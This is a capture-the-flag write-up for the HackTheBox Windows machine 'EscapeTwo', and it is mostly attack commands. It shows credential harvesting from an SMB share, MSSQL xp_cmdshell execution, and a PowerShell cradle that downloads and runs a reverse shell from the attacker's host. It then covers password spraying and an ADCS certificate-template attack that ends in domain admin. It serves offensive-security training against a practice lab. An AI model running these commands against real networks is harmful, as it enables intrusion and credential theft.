# HackTheBox Writeup: EscapeTwo

**Difficoltà:** Easy
**OS:** Windows
**Date:** 25/03/2026

## 1. Information Gathering & Reconnaissance
IP target: 10.129.232.128
Credentials: rose:KxEPkKe6R8su

### Port Scanning
We begin our enumeration by mapping the open ports and services on the target using Nmap. We use -sC to run default enumeration scripts, -sV to determine service versions, and -vv to print the output as it's discovered
`sudo nmap -sC -sV -vv -oA nmap/escapetwo 10.129.232.128`

<img width="1174" height="817" alt="image" src="https://github.com/user-attachments/assets/0c2bc363-9595-4511-9521-80bd9519f81f" />

The scan reveals a typical Active Directory environment (DNS, Kerberos, LDAP, SMB) alongside a Microsoft SQL Server (MSSQL) running on port 1433

## 2. Enumeration & Initial Access
### SMB & Authentication Mechanisms

Since we start with a valid set of credentials for the user rose, our first logical step is to explore the SMB shares to find sensitive information and enumerate domain users for future password spraying. We utilize NetExec (nxc) for this.

First, let's list the available shares:
`nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --shares`

<img width="1394" height="220" alt="image" src="https://github.com/user-attachments/assets/888f6273-a6ed-4975-a849-0cf442c974b5" />

We notice a non-default share named Accounting Department that we have READ access to. Before inspecting it, let's dump the list of domain users:
`nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --users`
<img width="1410" height="243" alt="image" src="https://github.com/user-attachments/assets/b15e5298-9865-40dd-8209-1c519b423c7d" />

We save these users to a file for later. Now, let's connect to the interesting Accounting Department share using smbclient to see what files are stored inside

`smbclient "//dc01.sequel.htb/Accounting Department" -U 'rose%KxEPkKe6R8su'`

<img width="1141" height="240" alt="image" src="https://github.com/user-attachments/assets/0239f34b-f0af-414e-a3d0-1873bd39fb70" />

### Extracting Credentials from Excel Files

We find and download an accounts.xlsx file. A great trick to quickly inspect Excel files from the CLI is to treat them as ZIP archives, because .xlsx files are essentially just zipped XML directories

`unzip accounts.xlsx`

<img width="1896" height="138" alt="image" src="https://github.com/user-attachments/assets/f9dd118c-ab0a-4277-8f4e-d562b5a7587d" />

All the string values from the spreadsheet cells are stored in xl/sharedStrings.xml. We can extract and parse this file using some basic sed and grep commands to filter out the XML tags and reveal the raw text:

`cat sharedStrings.xml | sed 's/></>\n</g' | sed 's/<[^>]*>//g' | grep -v '^$'`
<img width="823" height="406" alt="image" src="https://github.com/user-attachments/assets/2a919e58-9044-466e-84ad-5414df374603" />

This reveals a set of usernames and, crucially, a plaintext password for the MSSQL sa (System Administrator) account: MSSQLP@ssw0rd!

## 3. Foothold & MSSQL Exploitation
Armed with the sa credentials, we authenticate to the database. We use the --local-auth flag since sa is a local SQL account, not a domain account. We test command execution via the xp_cmdshell feature by passing the -x whoami flag:

`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth     `
`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami`

<img width="1212" height="295" alt="image" src="https://github.com/user-attachments/assets/feb8f657-ae2a-4e78-8a68-df9b6979f7f7" />

We successfully execute commands as nt service\mssql$sqlexpress. To upgrade this into a fully interactive session, we host a PowerShell reverse shell script (shell.ps1) on our local machine and execute it on the target using an in-memory download cradle:

`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.142:8000/shell.ps1")'`

Upon catching the shell, we check our user privileges (using whoami /priv). We notice that we do not have SeImpersonatePrivilege or SeDebugPrivilege. This means standard privilege escalation techniques like "Potato" attacks (JuicyPotato, PrintSpoofer, etc.) will not work here

<img width="1579" height="759" alt="image" src="https://github.com/user-attachments/assets/7bb9d6be-e709-42e2-af2c-2d00fdf22559" />

## 4. Lateral Movement & Active Directory Enumeration
While exploring the filesystem as the SQL service account, we uncover a configuration file containing another plaintext password: WqSZAF6CysDQbGb3.
Since we don't know who this belongs to, we perform a Password Spraying attack against the list of SMB users we enumerated earlier (final.txt), making sure to use --continue-on-success so NetExec checks all users:

<img width="570" height="478" alt="image" src="https://github.com/user-attachments/assets/7bd45e0f-a587-473d-9f1d-130ee97a31a6" />

`nxc smb 10.129.232.128 -u final.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success`

<img width="1431" height="191" alt="image" src="https://github.com/user-attachments/assets/bb312eca-db6c-4683-8cc3-990ec1d7149d" />

Ok, Ryan is a valid Domanio user with the password we found, now let's see what we can do with the user Ryan

<img width="1898" height="191" alt="image" src="https://github.com/user-attachments/assets/f115e530-7b34-4e92-88f6-e550a650887a" />

We get a hit! The password belongs to the domain user ryan.

To understand Ryan's role in the domain and map out potential attack paths, we need to run BloodHound. We transfer SharpHound.exe to the target machine via our Python HTTP server and execute it to collect Active Directory data natively:

`curl http://10.10.14.142:8000/SharpHound.exe -o sh.exe`

<img width="1226" height="391" alt="image" src="https://github.com/user-attachments/assets/5ac33eab-14b9-4613-a70e-5d69cf0528c4" />

## 5. Privilege Escalation via ADCS (ESC4 to ESC1)
While BloodHound is analyzing the data, we also check for Active Directory Certificate Services (ADCS) vulnerabilities using certipy-ad:

`certipy-ad find -u rose@sequel.htb -p  'KxEPkKe6R8su' -stdout`

<img width="724" height="284" alt="image" src="https://github.com/user-attachments/assets/61eda8ec-c9e2-4425-a792-e387e9660e35" />

### The Attack Path (ESC4)
By correlating the BloodHound graph and the Certipy output, we identify a clear path to Domain Admin:
Our compromised user ryan has the WriteOwner permission over the CA_SVC account.
The CA_SVC account is a member of the Cert Publishers group.
The Cert Publishers group has Full Control over the certificate templates, allowing them to modify templates and make them vulnerable (an attack known as ESC4).

### Step 1: Taking Ownership and Modifying DACL

First, we use Impacket's owneredit.py to exploit the WriteOwner privilege and make ryan the owner of ca_svc

`owneredit.py -action write -new-owner ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`

<img width="925" height="151" alt="image" src="https://github.com/user-attachments/assets/81ee873c-64a1-4819-a8af-4125e299aee2" />

Now that Ryan is the owner, he has the right to modify the Access Control List (DACL). We use dacledit.py to grant Ryan FullControl over the ca_svc account:

`dacledit.py -action write -rights FullControl -principal ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`

<img width="936" height="108" alt="image" src="https://github.com/user-attachments/assets/a451c8f9-60fe-45f5-a5d8-03d6c19b2a28" />

### Step 2: Shadow Credentials Attack

With Full Control, we can perform a Shadow Credentials attack to inject a Key Credential Link into ca_svc and retrieve its NTLM hash:

`certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 `

<img width="940" height="396" alt="image" src="https://github.com/user-attachments/assets/075dfa25-149e-4e7b-99a6-af280cdacea6" />

We verify the extracted hash 3b181b914e7a9d5508ea1e20bc2b7fce using NetExec to confirm we now have access as ca_svc:

`nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce`

<img width="937" height="79" alt="image" src="https://github.com/user-attachments/assets/fd216993-e3cc-4a20-9e26-554ca22fd1a8" />

### Step 3: Modifying the Template (ESC4)

Now acting as ca_svc (a member of Cert Publishers), we rewrite the configuration of the DunderMifflinAuthentication template. We use -write-default-configuration to intentionally introduce an ESC1 vulnerability, allowing any user to request a certificate on behalf of anyone else. We also save the old config for OPSEC purposes.

`certipy-ad template \
  -u ca_svc@sequel.htb \
  -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' \
  -dc-ip 10.129.232.128 \
  -template DunderMifflinAuthentication \
  -save-configuration old_config.json \
  -write-default-configuration`

<img width="940" height="281" alt="image" src="https://github.com/user-attachments/assets/2e541235-2c77-45e3-82f4-a280ff502fc4" />

### Step 4: Requesting Admin Certificate and Extracting Hash (ESC1)

With the template now vulnerable, we request a certificate explicitly specifying the Domain Administrator as the User Principal Name (UPN):

`certipy-ad req \
  -u ca_svc@sequel.htb \
  -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \
  -dc-ip 10.129.232.128 \
  -upn administrator@sequel.htb`

  <img width="713" height="281" alt="image" src="https://github.com/user-attachments/assets/8ca41e5c-14be-47d4-9853-225a3dcfb58d" />

Finally, we use the obtained administrator.pfx certificate to authenticate via PKINIT to the Domain Controller. This process decrypts and retrieves the NTLM hash of the Administrator, completing the full compromise of the domain.

`certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128`


``
``
``
``
``
``
``
``
``
